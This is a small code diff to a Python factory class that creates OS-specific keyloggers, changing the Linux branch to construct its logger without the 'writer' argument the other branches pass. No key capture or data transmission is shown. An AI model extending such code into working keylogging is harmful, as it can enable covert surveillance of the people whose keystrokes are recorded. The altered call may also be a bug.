@@ -13,7 +13,7 @@ class KeyLoggerFactory:
             return WindowsKeyLogger(writer)
         elif system == "linux":
             from services.loggers.linux_key_logger import LinuxKeyLogger
-            return LinuxKeyLogger(writer)
+            return LinuxKeyLogger()
         elif system == "darwin": # macOS
             from services.loggers.mac_key_logger import MacKeyLogger
             return MacKeyLogger(writer)
